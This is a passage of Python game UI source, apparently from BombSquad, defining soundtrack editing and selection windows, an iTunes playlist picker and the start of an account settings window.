        bColor = (0.6, 0.53, 0.63)
        bTextColor = (0.75, 0.7, 0.8)

        for index, songType in enumerate(types):
            r = bs.rowWidget(parent=self._col, size=(self._width-40, 40))
            bs.containerWidget(
                edit=r, claimsLeftRight=True, claimsTab=True,
                selectionLoopToParent=True)
            try:
                typeName = typeNamesTranslated[songType]
            except Exception:
                typeName = songType
            t = bs.textWidget(
                parent=r, size=(230, 25),
                alwaysHighlight=True, text=typeName, scale=0.7, hAlign='left',
                vAlign='center', maxWidth=190)

            if songType in self._soundtrack:
                entry = self._soundtrack[songType]
            else:
                entry = None

            if entry is not None:
                # make sure they dont muck with this after it gets to us
                entry = copy.deepcopy(entry)

            iconType = self._getEntryButtonDisplayIconType(entry)
            self._songTypeButtons[songType] = b = bs.buttonWidget(
                parent=r, size=(230, 32),
                label=self._getEntryButtonDisplayName(entry),
                textScale=0.6,
                onActivateCall=bs.Call(self._getEntry, songType,
                                       entry, typeName),
                icon=(self._fileTex if iconType == 'file'
                      else self._folderTex if iconType == 'folder' else None),
                iconColor=(1.1, 0.8, 0.2) if iconType == 'folder' else (
                    1, 1, 1),
                leftWidget=self._textField,
                iconScale=0.7, autoSelect=True, upWidget=prevTypeButton)
            if index == 0:
                bs.widget(edit=b, upWidget=self._textField)
            bs.widget(edit=b, downWidget=b)

            if (self._lastEditedSongType is not None
                    and songType == self._lastEditedSongType):
                bs.containerWidget(edit=r, selectedChild=b, visibleChild=b)
                bs.containerWidget(
                    edit=self._col, selectedChild=r, visibleChild=r)
                bs.containerWidget(edit=self._scrollWidget,
                                   selectedChild=self._col,
                                   visibleChild=self._col)
                bs.containerWidget(edit=self._rootWidget,
                                   selectedChild=self._scrollWidget,
                                   visibleChild=self._scrollWidget)

            if prevTypeButton is not None:
                bs.widget(edit=prevTypeButton, downWidget=b)
            prevTypeButton = b
            t = bs.textWidget(parent=r, size=(10, 32), text='')  # spacing..
            b = bs.buttonWidget(
                parent=r, size=(50, 32),
                label=bs.Lstr(resource=self._r + '.testText'),
                textScale=0.6, onActivateCall=bs.Call(self._test, songType),
                upWidget=prevTestButton
                if prevTestButton is not None else self._textField)
            if prevTestButton is not None:
                bs.widget(edit=prevTestButton, downWidget=b)
            bs.widget(edit=b, downWidget=b, rightWidget=b)
            prevTestButton = b

    @classmethod
    def _restoreEditor(cls, state, musicType, entry):
        # apply the change and recreate the window
        soundtrack = state['soundtrack']
        existingEntry = (None if musicType not in soundtrack
                         else soundtrack[musicType])
        if existingEntry != entry:
            bs.playSound(bs.getSound('gunCocking'))

        # make sure this doesn't get mucked with after we get it
        if entry is not None:
            entry = copy.deepcopy(entry)

        entryType = bsUtils._getSoundtrackEntryType(entry)
        if entryType == 'default':
            # for 'default' entries simply exclude them from the list
            if musicType in soundtrack:
                del soundtrack[musicType]
        else:
            soundtrack[musicType] = entry

        uiGlobals['mainMenuWindow'] = cls(
            state, transition='inLeft').getRootWidget()

    def _getEntry(self, songType, entry, selectionTargetName):
        if selectionTargetName != '':
            selectionTargetName = "'"+selectionTargetName+"'"
        state = {
            'name': self._soundtrackName,
            'existingName': self._existingSoundtrackName,
            'soundtrack': self._soundtrack, 'lastEditedSongType': songType}
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = bsUtils.getMusicPlayer().selectEntry(
            bs.Call(self._restoreEditor, state, songType),
            entry, selectionTargetName).getRootWidget()

    def _test(self, songType):
        # warn if volume is zero
        if bsInternal._getSetting("Music Volume") < 0.01:
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource=self._r + '.musicVolumeZeroWarning'),
                color=(1, 0.5, 0))
        bsUtils.setMusicPlayMode('test')
        bsUtils._playMusic(songType, mode='test',
                           testSoundtrack=self._soundtrack)

    def _getEntryButtonDisplayName(self, entry):
        entryType = bsUtils._getSoundtrackEntryType(entry)
        if entryType == 'default':
            entryName = bs.Lstr(resource=self._r+'.defaultGameMusicText')
        elif entryType in ('musicFile', 'musicFolder'):
            entryName = os.path.basename(bsUtils._getSoundtrackEntryName(entry))
        else:
            entryName = bsUtils._getSoundtrackEntryName(entry)
        return entryName

    def _getEntryButtonDisplayIconType(self, entry):
        entryType = bsUtils._getSoundtrackEntryType(entry)
        if entryType == 'musicFile':
            return 'file'
        elif entryType == 'musicFolder':
            return 'folder'
        else:
            return None

    def _cancel(self):
        # resets music back to normal..
        bsUtils.setMusicPlayMode('regular')
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = SoundtracksWindow(
            transition='inLeft').getRootWidget()

    def _doIt(self):

        bsConfig = bs.getConfig()
        newName = bs.uni(bs.textWidget(query=self._textField))
        if (newName != self._soundtrackName
                and newName in bsConfig['Soundtracks']):
            bs.screenMessage(
                bs.Lstr(resource=self._r+'.cantSaveAlreadyExistsText'))
            bs.playSound(bs.getSound('error'))
            return
        if len(newName) == 0:
            bs.playSound(bs.getSound('error'))
            return
        if newName == bs.Lstr(
                resource=self._r + '.defaultSoundtrackNameText').evaluate():
            bs.screenMessage(
                bs.Lstr(resource=self._r+'.cantOverwriteDefaultText'))
            bs.playSound(bs.getSound('error'))
            return

        # make sure config exists
        try:
            bsConfig['Soundtracks']
        except Exception:
            bsConfig['Soundtracks'] = {}

        # if we had an old one, delete it
        if (self._existingSoundtrackName is not None
                and self._existingSoundtrackName in bsConfig['Soundtracks']):
            del bsConfig['Soundtracks'][self._existingSoundtrackName]
        bsConfig['Soundtracks'][newName] = self._soundtrack
        bsConfig['Soundtrack'] = newName

        bs.writeConfig()
        bs.playSound(bs.getSound('gunCocking'))
        bs.containerWidget(edit=self._rootWidget, transition='outRight')

        # resets music back to normal
        bsUtils.setMusicPlayMode('regular', forceRestart=True)

        uiGlobals['mainMenuWindow'] = SoundtracksWindow(
            transition='inLeft').getRootWidget()

    def _doItWithSound(self):
        bs.playSound(bs.getSound('swish'))
        self._doIt()


class GetSoundtrackEntryTypeWindow(Window):

    def __init__(
            self, callback, currentEntry, selectionTargetName,
            transition='inRight'):

        self._r = 'editSoundtrackWindow'

        self._callback = callback
        self._currentEntry = copy.deepcopy(currentEntry)

        self._width = 580
        self._height = 220
        spacing = 80

        doDefault = True
        doITunesPlaylist = bsUtils._isSoundtrackEntryTypeSupported(
            'iTunesPlaylist')
        doMusicFile = bsUtils._isSoundtrackEntryTypeSupported('musicFile')
        doMusicFolder = bsUtils._isSoundtrackEntryTypeSupported('musicFolder')

        if doITunesPlaylist:
            self._height += spacing
        if doMusicFile:
            self._height += spacing
        if doMusicFolder:
            self._height += spacing

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition=transition, scale=1.7
            if gSmallUI else 1.4 if gMedUI else 1.0)
        b = bs.buttonWidget(parent=self._rootWidget,
                            position=(35, self._height - 65),
                            size=(160, 60),
                            scale=0.8, textScale=1.2, label=bs.Lstr(
                                resource='cancelText'),
                            onActivateCall=self._onCancelPress)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)
        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 32),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.selectASourceText'),
            color=gTitleColor, maxWidth=230, hAlign="center", vAlign="center")

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 56),
            size=(0, 0),
            text=selectionTargetName, color=gInfoTextColor, scale=0.7,
            maxWidth=230, hAlign="center", vAlign="center")

        v = self._height - 155

        currentEntryType = bsUtils._getSoundtrackEntryType(currentEntry)

        if doDefault:
            b = defaultGameMusicButton = bs.buttonWidget(
                parent=self._rootWidget, size=(self._width - 100, 60),
                position=(50, v),
                label=bs.Lstr(
                    resource=self._r + '.useDefaultGameMusicText'),
                onActivateCall=self._onDefaultPress)
            if currentEntryType == 'default':
                bs.containerWidget(edit=self._rootWidget, selectedChild=b)
            v -= spacing

        if doITunesPlaylist:
            b = iTunesPlaylistButton = bs.buttonWidget(
                parent=self._rootWidget, size=(self._width - 100, 60),
                position=(50, v),
                label=bs.Lstr(resource=self._r + '.useITunesPlaylistText'),
                onActivateCall=self._onITunesPlaylistPress, icon=None)
            if currentEntryType == 'iTunesPlaylist':
                bs.containerWidget(edit=self._rootWidget, selectedChild=b)
            v -= spacing

        if doMusicFile:
            b = musicFileButton = bs.buttonWidget(
                parent=self._rootWidget, size=(self._width - 100, 60),
                position=(50, v),
                label=bs.Lstr(resource=self._r + '.useMusicFileText'),
                onActivateCall=self._onMusicFilePress, icon=bs.getTexture(
                    'file'))
            if currentEntryType == 'musicFile':
                bs.containerWidget(edit=self._rootWidget, selectedChild=b)
            v -= spacing

        if doMusicFolder:
            b = musicFolderButton = bs.buttonWidget(
                parent=self._rootWidget, size=(self._width - 100, 60),
                position=(50, v),
                label=bs.Lstr(resource=self._r + '.useMusicFolderText'),
                onActivateCall=self._onMusicFolderPress, icon=bs.getTexture(
                    'folder'),
                iconColor=(1.1, 0.8, 0.2))
            if currentEntryType == 'musicFolder':
                bs.containerWidget(edit=self._rootWidget, selectedChild=b)
            v -= spacing

    def _onITunesPlaylistPress(self):
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')

        if bsUtils._getSoundtrackEntryType(
                self._currentEntry) == 'iTunesPlaylist':
            currentPlaylistEntry = bsUtils._getSoundtrackEntryName(
                self._currentEntry)
        else:
            currentPlaylistEntry = None
        uiGlobals['mainMenuWindow'] = GetMacITunesPlaylistWindow(
            self._callback, currentPlaylistEntry,
            self._currentEntry).getRootWidget()

    def _onMusicFilePress(self):
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        basePath = bsInternal._androidGetExternalStoragePath()
        uiGlobals['mainMenuWindow'] = FileSelectorWindow(
            basePath, callback=self._musicFileSelectorCB, showBasePath=False,
            validFileExtensions=bsUtils._getValidMusicFileExtensions(),
            allowFolders=False).getRootWidget()

    def _onMusicFolderPress(self):
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        basePath = bsInternal._androidGetExternalStoragePath()
        uiGlobals['mainMenuWindow'] = FileSelectorWindow(
            basePath, callback=self._musicFolderSelectorCB, showBasePath=False,
            validFileExtensions=[],
            allowFolders=True).getRootWidget()

    def _musicFileSelectorCB(self, result):
        if result is None:
            self._callback(self._currentEntry)
        else:
            self._callback({'type': 'musicFile', 'name': bs.uni(result)})

    def _musicFolderSelectorCB(self, result):
        if result is None:
            self._callback(self._currentEntry)
        else:
            self._callback({'type': 'musicFolder', 'name': bs.uni(result)})

    def _onDefaultPress(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        self._callback(None)

    def _onCancelPress(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        self._callback(self._currentEntry)


class GetMacITunesPlaylistWindow(Window):

    def __init__(self, callback, existingPlaylist, existingEntry):
        self._r = 'editSoundtrackWindow'
        self._callback = callback
        self._existingPlaylist = existingPlaylist
        self._existingEntry = copy.deepcopy(existingEntry)
        self._width = 520
        self._height = 520
        self._spacing = 45
        v = self._height - 90
        v -= self._spacing*1.0
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition='inRight')
        b = bs.buttonWidget(
            parent=self._rootWidget, position=(35, self._height - 65),
            size=(130, 50),
            label=bs.Lstr(resource='cancelText'),
            onActivateCall=self._back)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)
        t = bs.textWidget(
            parent=self._rootWidget, position=(20, self._height - 54),
            size=(self._width, 25),
            text=bs.Lstr(resource=self._r + '.selectAPlaylistText'),
            color=gTitleColor, hAlign="center", vAlign="center", maxWidth=200)
        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, position=(40, v - 340),
            size=(self._width - 80, 400))
        self._column = bs.columnWidget(parent=self._scrollWidget)

        # so selection loops through everything and doesn't get stuck
        # in sub-containers
        bs.containerWidget(
            edit=self._scrollWidget, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)
        bs.containerWidget(
            edit=self._column, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)

        bs.textWidget(parent=self._column, size=(self._width-80, 22),
                      text=bs.Lstr(resource=self._r+'.fetchingITunesText'),
                      color=(0.6, 0.9, 0.6, 1.0), scale=0.8)
        bsUtils.getMusicPlayer()._thread.getPlaylists(self._playlistsCB)
        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=self._scrollWidget)

    def _playlistsCB(self, playlists):
        if self._column.exists():
            for w in self._column.getChildren():
                w.delete()
            for p in playlists:
                t = bs.textWidget(
                    parent=self._column, size=(self._width - 80, 30),
                    text=p, vAlign='center', maxWidth=self._width - 110,
                    selectable=True, onActivateCall=bs.Call(self._sel, p),
                    clickActivate=True)
                if p == self._existingPlaylist:
                    bs.columnWidget(edit=self._column,
                                    selectedChild=t, visibleChild=t)

    def _sel(self, selection):
        if self._rootWidget.exists():
            bs.containerWidget(edit=self._rootWidget, transition='outRight')
            self._callback({'type': 'iTunesPlaylist', 'name': selection})

    def _back(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        self._callback(self._existingEntry)


class SoundtracksWindow(Window):

    def __init__(self, transition='inRight', originWidget=None):

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._r = 'editSoundtrackWindow'
        self._width = 800 if gSmallUI else 600
        xInset = 100 if gSmallUI else 0
        self._height = 340 if gSmallUI else 370 if gMedUI else 440
        spacing = 40
        v = self._height - 40
        v -= spacing*1.0
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition=transition, toolbarVisibility='MENU_MINIMAL',
            scaleOriginStackOffset=scaleOrigin, scale=2.3
            if gSmallUI else 1.6 if gMedUI else 1.0, stackOffset=(0, -18)
            if gSmallUI else(0, 0))

        if gToolbars and gSmallUI:
            self._backButton = None
        else:
            self._backButton = backButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(45 + xInset, self._height - 60),
                size=(120, 60),
                scale=0.8, label=bs.Lstr(resource='backText'),
                buttonType='back', autoSelect=True)
            if gDoAndroidNav:
                bs.buttonWidget(edit=self._backButton, buttonType='backSmall',
                                size=(60, 60), label=bs.getSpecialChar('back'))

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 35),
            size=(0, 0),
            maxWidth=300, text=bs.Lstr(resource=self._r + '.titleText'),
            color=gTitleColor, hAlign="center", vAlign="center")

        h = 43+xInset
        v = self._height - 60
        hspacing = 15
        bColor = (0.6, 0.53, 0.63)
        bTextColor = (0.75, 0.7, 0.8)
        lockTex = bs.getTexture('lock')
        self._lockImages = []

        s = 1.0 if gSmallUI else 1.13 if gMedUI else 1.4
        v -= 60.0*s
        self._newButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(100, 55.0 * s),
            onActivateCall=self._newSoundtrack, color=bColor,
            buttonType='square', autoSelect=True, textColor=bTextColor,
            textScale=0.7, label=bs.Lstr(resource=self._r + '.newText'))
        self._lockImages.append(bs.imageWidget(parent=self._rootWidget,
                                               size=(30, 30),
                                               drawController=b,
                                               position=(h-10, v+55.0*s-28),
                                               texture=lockTex))

        if self._backButton is None:
            bs.widget(edit=b, leftWidget=bsInternal._getSpecialWidget(
                'backButton'))
        v -= 60.0*s

        self._editButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(100, 55.0 * s),
            onActivateCall=self._editSoundtrack, color=bColor,
            buttonType='square', autoSelect=True, textColor=bTextColor,
            textScale=0.7, label=bs.Lstr(resource=self._r + '.editText'))
        self._lockImages.append(bs.imageWidget(parent=self._rootWidget,
                                               size=(30, 30),
                                               drawController=b,
                                               position=(h-10, v+55.0*s-28),
                                               texture=lockTex))
        if self._backButton is None:
            bs.widget(edit=b, leftWidget=bsInternal._getSpecialWidget(
                'backButton'))
        v -= 60.0*s

        self._duplicateButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(100, 55.0 * s),
            onActivateCall=self._duplicateSoundtrack, buttonType='square',
            autoSelect=True, color=bColor, textColor=bTextColor, textScale=0.7,
            label=bs.Lstr(resource=self._r + '.duplicateText'))
        self._lockImages.append(bs.imageWidget(parent=self._rootWidget,
                                               size=(30, 30),
                                               drawController=b,
                                               position=(h-10, v+55.0*s-28),
                                               texture=lockTex))
        if self._backButton is None:
            bs.widget(edit=b, leftWidget=bsInternal._getSpecialWidget(
                'backButton'))
        v -= 60.0*s

        self._deleteButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(100, 55.0 * s),
            onActivateCall=self._deleteSoundtrack, color=bColor,
            buttonType='square', autoSelect=True, textColor=bTextColor,
            textScale=0.7, label=bs.Lstr(resource=self._r + '.deleteText'))
        self._lockImages.append(bs.imageWidget(parent=self._rootWidget,
                                               size=(30, 30),
                                               drawController=b,
                                               position=(h-10, v+55.0*s-28),
                                               texture=lockTex))
        if self._backButton is None:
            bs.widget(edit=b, leftWidget=bsInternal._getSpecialWidget(
                'backButton'))

        # keep our lock images up to date/etc.
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)
        self._update()

        v = self._height - 65
        scrollHeight = self._height - 105
        v -= scrollHeight
        hspacing = 15
        self._scrollWidget = scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, position=(152+xInset, v),
            highlight=False, size=(self._width-(205+2*xInset), scrollHeight))
        bs.widget(edit=self._scrollWidget, leftWidget=self._newButton,
                  rightWidget=bsInternal._getSpecialWidget('partyButton')
                  if gToolbars else self._scrollWidget)
        self._c = bs.columnWidget(parent=scrollWidget)

        self._soundtracks = None
        self._selectedSoundtrack = None
        self._selectedSoundtrackIndex = None
        self._soundtrackWidgets = []
        self._allowChangingSoundtracks = False
        self._refresh()
        if self._backButton is not None:
            bs.buttonWidget(edit=backButton, onActivateCall=self._back)
            bs.containerWidget(edit=self._rootWidget, cancelButton=backButton)
        else:
            bs.containerWidget(edit=self._rootWidget, onCancelCall=self._back)

    def _update(self):
        haveProOptions = bsUtils._haveProOptions()
        for lock in self._lockImages:
            bs.imageWidget(edit=lock, opacity=0.0 if haveProOptions else 1.0)

    def _doDeleteSoundtrack(self):
        try:
            del bs.getConfig()['Soundtracks'][self._selectedSoundtrack]
        except Exception:
            pass
        bs.writeConfig()
        bs.playSound(bs.getSound('shieldDown'))
        if self._selectedSoundtrackIndex >= len(self._soundtracks):
            self._selectedSoundtrackIndex = len(self._soundtracks)
        self._refresh()

    def _deleteSoundtrack(self):
        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return
        if self._selectedSoundtrack is None:
            return
        if self._selectedSoundtrack == '__default__':
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource=self._r + '.cantDeleteDefaultText'),
                color=(1, 0, 0))
        else:
            ConfirmWindow(
                bs.Lstr(
                    resource=self._r + '.deleteConfirmText',
                    subs=[("${NAME}", self._selectedSoundtrack)]),
                self._doDeleteSoundtrack, 450, 150)

    def _duplicateSoundtrack(self):
        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return
        try:
            soundtracks = [bs.getConfig()['Soundtracks']]
        except Exception:
            bs.getConfig()['Soundtracks'] = {}

        if self._selectedSoundtrack is None:
            return
        if self._selectedSoundtrack == '__default__':
            pl = {}
        else:
            pl = bs.getConfig()['Soundtracks'][self._selectedSoundtrack]

        # find a valid dup name that doesn't exist
        testIndex = 1
        copyText = bs.Lstr(resource='copyOfText').evaluate()
        # get just 'Copy' or whatnot
        copyWord = copyText.replace('${NAME}', '').strip()
        baseName = self._getSoundtrackDisplayName(
            self._selectedSoundtrack).evaluate()
        if type(baseName) is not unicode:
            print 'expected uni baseName 3fj0'
            baseName = baseName.decode('utf-8')

        # if it looks like a copy, strip digits and spaces off the end
        if copyWord in baseName:
            while baseName[-1].isdigit() or baseName[-1] == ' ':
                baseName = baseName[:-1]
        while True:
            if copyWord in baseName:
                testName = baseName
            else:
                testName = copyText.replace('${NAME}', baseName)
            if testIndex > 1:
                testName += ' '+str(testIndex)
            if not testName in bs.getConfig()['Soundtracks']:
                break
            testIndex += 1

        bs.getConfig()['Soundtracks'][testName] = copy.deepcopy(pl)
        bs.writeConfig()
        self._refresh(selectSoundtrack=testName)

    def _select(self, name, index):
        self._selectedSoundtrackIndex = index
        self._selectedSoundtrack = name

        try:
            currentSoundtrack = bs.getConfig()['Soundtrack']
        except Exception:
            currentSoundtrack = '__default__'

        # if it varies from current, write to prefs and apply
        if currentSoundtrack != name and self._allowChangingSoundtracks:
            bs.playSound(bs.getSound('gunCocking'))
            bs.getConfig()['Soundtrack'] = self._selectedSoundtrack
            bs.writeConfig()
            # just play whats already playing.. this'll grab it from the
            # new soundtrack
            bsUtils._playMusic(bsUtils.gMusicTypes['regular'])

    def _back(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = ConfigAudioWindow(
            transition='inLeft').getRootWidget()

    def _editSoundtrackWithSound(self):
        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return
        bs.playSound(bs.getSound('swish'))
        self._editSoundtrack()

    def _editSoundtrack(self):
        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return
        if self._selectedSoundtrack is None:
            return
        if self._selectedSoundtrack == u'__default__':
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource=self._r + '.cantEditDefaultText'),
                color=(1, 0, 0))
            return

        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = EditSoundtrackWindow(
            existingSoundtrack=self._selectedSoundtrack).getRootWidget()

    def _getSoundtrackDisplayName(self, soundtrack):
        if soundtrack == '__default__':
            return bs.Lstr(resource=self._r+'.defaultSoundtrackNameText')
        else:
            return bs.Lstr(value=soundtrack)

    def _refresh(self, selectSoundtrack=None):
        self._allowChangingSoundtracks = False
        oldSelection = self._selectedSoundtrack
        # if there was no prev selection, look in prefs
        if oldSelection is None:
            try:
                oldSelection = bs.getConfig()['Soundtrack']
            except Exception:
                pass
        oldSelectionIndex = self._selectedSoundtrackIndex

        # delete old
        while len(self._soundtrackWidgets) > 0:
            self._soundtrackWidgets.pop().delete()
        try:
            self._soundtracks = bs.getConfig()['Soundtracks']
        except Exception:
            self._soundtracks = {}
        items = self._soundtracks.items()
        items.sort(key=lambda x: x[0].lower())
        items = [['__default__', None]] + items  # default is always first
        index = 0
        for pName, p in items:
            w = bs.textWidget(
                parent=self._c, size=(self._width - 40, 24),
                text=self._getSoundtrackDisplayName(pName),
                hAlign='left', vAlign='center', maxWidth=self._width - 110,
                alwaysHighlight=True, onSelectCall=bs.WeakCall(
                    self._select, pName, index),
                onActivateCall=self._editSoundtrackWithSound, selectable=True)
            if index == 0:
                bs.widget(edit=w, upWidget=self._backButton)
            self._soundtrackWidgets.append(w)
            # select this one if the user requested it
            if selectSoundtrack is not None:
                if pName == selectSoundtrack:
                    bs.columnWidget(
                        edit=self._c, selectedChild=w, visibleChild=w)
            else:
                # select this one if it was previously selected
                if oldSelectionIndex is not None:  # go by index if there's one
                    if index == oldSelectionIndex:
                        bs.columnWidget(
                            edit=self._c, selectedChild=w, visibleChild=w)
                else:  # otherwise look by name
                    if pName == oldSelection:
                        bs.columnWidget(
                            edit=self._c, selectedChild=w, visibleChild=w)
            index += 1

        # explicitly run select callback on current one and re-enable callbacks

        # eww need to run this in a timer so it happens after our select
        # calbacks.. with a small-enough time sometimes it happens before
        # anyway.. ew. need a way to just schedule a callable i guess..
        bs.realTimer(100, bs.WeakCall(self._setAllowChanging))

    def _setAllowChanging(self):
        self._allowChangingSoundtracks = True
        self._select(self._selectedSoundtrack, self._selectedSoundtrackIndex)

    def _newSoundtrack(self):
        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        EditSoundtrackWindow(existingSoundtrack=None)

    def _createDone(self, newSoundtrack):
        if newSoundtrack is not None:
            bs.playSound(bs.getSound('gunCocking'))
            self._refresh(selectSoundtrack=newSoundtrack)

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._scrollWidget:
                selName = 'Scroll'
            elif sel == self._newButton:
                selName = 'New'
            elif sel == self._editButton:
                selName = 'Edit'
            elif sel == self._duplicateButton:
                selName = 'Duplicate'
            elif sel == self._deleteButton:
                selName = 'Delete'
            elif sel == self._backButton:
                selName = 'Back'
            else:
                raise Exception("unrecognized selection")
            gWindowStates[self.__class__.__name__] = selName
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]
            except Exception:
                selName = None
            if selName == 'Scroll':
                sel = self._scrollWidget
            elif selName == 'New':
                sel = self._newButton
            elif selName == 'Edit':
                sel = self._editButton
            elif selName == 'Duplicate':
                sel = self._duplicateButton
            elif selName == 'Delete':
                sel = self._deleteButton
            else:
                sel = self._scrollWidget
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)


class AccountWindow(Window):

    def __init__(
            self, transition='inRight', modal=False, originWidget=None,
            closeOnceSignedIn=False):

        self._closeOnceSignedIn = closeOnceSignedIn

        bsInternal._setAnalyticsScreen('Account Window')

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._r = 'accountSettingsWindow'
        self._modal = modal
        self._needsRefresh = False
        self._signedIn = (bsInternal._getAccountState() == 'SIGNED_IN')
        self._accountStateNum = bsInternal._getAccountStateNum()
        self._showLinked = (
            True if self._signedIn
            and bsInternal._getAccountMiscReadVal('allowAccountLinking2', False)
            else False)
        self._checkSignInTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)

        # currently we can only reset achievements on game-center..
        if self._signedIn:
            accountType = bsInternal._getAccountType()
        else:
            accountType = None
        if accountType == 'Game Center':
            self._canResetAchievements = True
        else:
            self._canResetAchievements = False

        env = bs.getEnvironment()

        self._width = 760 if gSmallUI else 660
        xOffs = 50 if gSmallUI else 0
        self._height = 390 if gSmallUI else 430 if gMedUI else 490

        self._signInButton = None
        self._signInText = None

        self._scrollWidth = self._width - (100+xOffs*2)
        self._scrollHeight = self._height - 120
        self._subWidth = self._scrollWidth-20

        # determine which sign-in/sign-out buttons we should show..
        self._showSignInButtons = []

        if env['platform'] == 'android' and env['subplatform'] == 'google':
            self._showSignInButtons.append('Google Play')

        elif env['platform'] == 'android' and env['subplatform'] == 'amazon':
            self._showSignInButtons.append('Game Circle')

        # Local accounts are generally always available with a few key
        # exceptions
        self._showSignInButtons.append('Local')

        # show old test-account option *only* if we've been installed since
        # before build 14101
        # (after then, people should just use device accounts for the same
        # purpose)
        if env['testBuild'] or(
                env['platform'] ==
                'android' and env['subplatform'] in['oculus', 'cardboard']):
            if bs.getConfig().get('lc14c', 0) > 1:
                self._showSignInButtons.append('Test')

        topExtra = 15 if gSmallUI else 0
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            transition=transition, toolbarVisibility='MENU_MINIMAL',
            scaleOriginStackOffset=scaleOrigin, scale=2.09
            if gSmallUI else 1.4 if gMedUI else 1.0, stackOffset=(0, -19)
            if gSmallUI else(0, 0))
        if gSmallUI and gToolbars:
            self._backButton = None
            bs.containerWidget(edit=self._rootWidget, onCancelCall=self._back)
        else:
            self._backButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(51 + xOffs, self._height - 62),
                size=(120, 60),
                scale=0.8, textScale=1.2, autoSelect=True, label=bs.Lstr(
                    resource='doneText' if self._modal else 'backText'),
                buttonType='regular' if self._modal else 'back',
                onActivateCall=self._back)
            bs.containerWidget(edit=self._rootWidget, cancelButton=b)
            if not self._modal and gDoAndroidNav:
                bs.buttonWidget(
                    edit=b, buttonType='backSmall', size=(60, 56),
                    label=bs.getSpecialChar('back'))

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 41),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.titleText'),
            color=gTitleColor, maxWidth=self._width - 340, hAlign="center",
            vAlign="center")

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, highlight=False,
            position=((self._width - self._scrollWidth) * 0.5,
                      self._height - 65 - self._scrollHeight),
            size=(self._scrollWidth, self._scrollHeight))
        self._subContainer = None
        self._refresh()
        self._restore_state()

    def _update(self):

        # if they want us to close once we're signed in, do so.
        if self._closeOnceSignedIn and self._signedIn:
            self._back()
            return

        dirty = False

        # hmm should update this to use getAccountStateNum;
        # theoretically if we switch from one signed-in account to another
        # in the background this would break.
        accountStateNum = bsInternal._getAccountStateNum()
        accountState = bsInternal._getAccountState()

        showLinked = (
            True if self._signedIn and bsInternal._getAccountMiscReadVal(
                'allowAccountLinking2', False) else False)

        if (accountStateNum != self._accountStateNum
                or self._showLinked != showLinked or self._needsRefresh):
            self._showLinked = showLinked
            accountType = bsInternal._getAccountType(
            ) if accountState == 'SIGNED_IN' else 'unknown'
            self._accountStateNum = accountStateNum
            self._signedIn = (accountState == 'SIGNED_IN')
            self._refresh()

        # go ahead and refresh some individual things that may change under us..
        self._updateLinkedAccountsText()
        self._updateUnlinkAccountsButton()
        self._refreshCampaignProgressText()
        self._refreshAchievements()
        self._refreshTicketsText()
        self._refreshAccountNameText()

